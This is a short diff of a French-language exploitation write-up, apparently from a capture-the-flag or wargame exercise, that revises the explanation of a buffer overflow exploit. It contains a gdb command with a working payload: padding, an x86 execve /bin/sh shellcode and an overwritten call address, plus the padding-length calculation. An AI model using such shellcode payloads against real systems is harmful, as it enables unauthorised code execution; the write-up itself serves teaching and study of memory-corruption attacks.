@@ -20,8 +20,8 @@ EAX: 0x41366441 ('Ad6A')
 
     gdb-peda$ r `python -c 'print "AAAA" + "B" * 83 + "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "\x0c\xa0\x04\x08"'`
     nous pouvons remarquer que se sont les 4 premieres valeurs copié par le memcpy qui sont transmis a edx avant le call edx.
-
-on va donc placer l'adresse du buffer en premier, suivi d'instructions n'influant en rien d'une longueur
+	
+Nous allons donc placer en premiere valeur de l'argv l'adresse ou est contenue le shellcode suivi d'instructions n'influant en rien d'une longueur
     len = 108 - ([addr buffer] + [shellcode])
     len = 83
 
